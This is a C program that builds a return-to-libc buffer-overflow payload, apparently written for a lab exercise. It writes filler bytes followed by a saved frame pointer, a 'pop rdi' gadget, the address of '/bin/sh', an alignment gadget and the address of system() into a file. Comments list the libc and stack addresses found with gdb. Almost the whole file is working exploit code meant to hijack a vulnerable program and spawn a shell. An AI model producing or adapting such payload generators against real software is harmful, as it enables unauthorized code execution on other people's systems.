#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char* littleEndian(char *str, int numChars);

// 0x7fffffffdc30 address of buf according to gdb
// 0x7ffff7b99673 address of /bin/sh/
// 0x7fffffffdca0 <- start of buf according to a.out
// 0x7ffff7a48070 <- Address of system library call in libc

// 0x7ffff7a47ae0 <- address of do_system in libc

// 0x7fffffffdc60 original rbp -> set that into the fp.

//
// 0x7ffff7baa5d5 <- 0x5f 0xc3 (gadget) pop %rdi  retq
//

//7FFFF7A47F7C <- execve call in do_system

// prev fp value: 0x400550 prev fp address: 0x7fffffffdc60


// 0x7ffff7a2188a <- original return when main calls puts

#define ADDR_SIZE 64
#define BITS_IN_BYTE 8

int main(int argc, char *argv[]){
  FILE *file = fopen("in", "wb");
  int fileSize;
  int i;
  char ch = 0x90;
  char nul = 0x00;
  char input;
  int numChars;
  unsigned char *instFile;
  unsigned char *mainRet;
  unsigned char *retAddr;
  unsigned char *shAddr;
  unsigned char *sysAddr;
  unsigned char *fpAddr;
  unsigned char *gadget2;

  //strcpy(addr, "0x7fffffffdc30");

  //fp address
  //fpAddr = littleEndian("0x7fffffffdd48", 8);
  fpAddr = littleEndian("0x7fffffffdc00", 8);
  //fpAddr = littleEndian("0x400630", 8);
  
  //value of prev fp
  mainRet = littleEndian("0x7ffff7a2188a", 8);
  //mainRet = littleEndian("0x7fffffffdd48", 8);
  
  //address of /bin/sh in little endian

  //NOTE - in the child process, for some reason, it seems to be taking 0x7ffff7b99670 instead of 73 as the last byte. I'm not sure why - but I think this is our bug
  shAddr = littleEndian("0x7ffff7b99673", 8);

  //address of system library call little endian
  sysAddr = littleEndian("0x7ffff7a48070", 8);
  //sysAddr = littleEndian("0x7FFFF7A47F7C", 8);  

  //address of gadget
  retAddr = littleEndian("0x7ffff7baa5d5", 8);

  gadget2 = littleEndian("0x7ffff7baa5d6", 8);
  
  unsigned char *byteAddr;

  if(argc != 2){
    printf("Wrong number of arguments, use ./gen [num_bytes_in_buffer]\n");
    printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
    exit(1);
  }

  numChars = atoi(argv[1]); //+8 bytes for fp 
  
  if(file == NULL){
    printf("Error opening file. Exiting.");
    exit(1);
  }

  char cRef = 'a';
  
  //write nop sled up to number of characters
  for(i = 1; i <= numChars; ++i){
    fwrite(&cRef, 1, 1, file);
    if( 0 == i % 8 )
      cRef++;    // Key to finding errors.
  }
  
  //unsigned char * pTemp = littleEndian("0x1", 8);
  unsigned char* pTemp = littleEndian( "0x400550", 8 );
  //
  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
  fwrite(fpAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
  //write return address
  fwrite(retAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
  //write address of /bin/sh
  fwrite(shAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);

  //return to gageth retq to align stack 16 bytes
  fwrite(gadget2, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);

  //write address of 'system' library call
  fwrite(sysAddr, sizeof(char),  ADDR_SIZE / BITS_IN_BYTE, file);

  //fwrite(littleEndian("0x1", 8), 1, 8, file);
  //fwrite(littleEndian("0x7fffffffde28", 8), 1, 8, file);
  
  //rewrite original FP
  //fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
  
  //rewrite original return address
  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);  
  
  free(pTemp);
  free(mainRet);
  free(retAddr);
  free(shAddr);
  free(sysAddr);
  free(fpAddr);

  fclose(file); 
}


//consider passing output through a parameter & returning size of returned array.
unsigned char* littleEndian(char *addr, int numBytes){
  unsigned char *tmpRet = malloc(ADDR_SIZE / 4);
  unsigned char *ret = malloc(ADDR_SIZE / 8);
  char tmp, tmp2;
  int i = 0, j;

  long long hex = strtoll(addr, NULL, 16);
  
  for(i = 0; i < (ADDR_SIZE / 4) - numBytes; i++){
    tmpRet[i] = 0;
  }

  i = ADDR_SIZE / 4 - 1;

  //place hex into char array hex by hex
  while(hex != 0){ 
    tmpRet[i] = hex & 0xF;
    hex = hex >> 4;
    i--;
  }
   
  //swap byte order
  j = ADDR_SIZE / 4 - 1;
  for(i = 0; i < ADDR_SIZE / 8; i+=2){
    tmp = tmpRet[i];
    tmp2 = tmpRet[i+1];

    tmpRet[i] = tmpRet[j-1];
    tmpRet[i+1] = tmpRet[j];    
    
    tmpRet[j - 1] = tmp;
    tmpRet[j] = tmp2;

    j-=2;
  }
  
  //crunch char array to maintain one byte of hex in each element (rather than a single hex digit).
  for(i = 0; i < ADDR_SIZE / 8; i++){
    ret[i] = tmpRet[(i*2)] << 4 | tmpRet[(i*2)+1];
  }

  return ret;
}
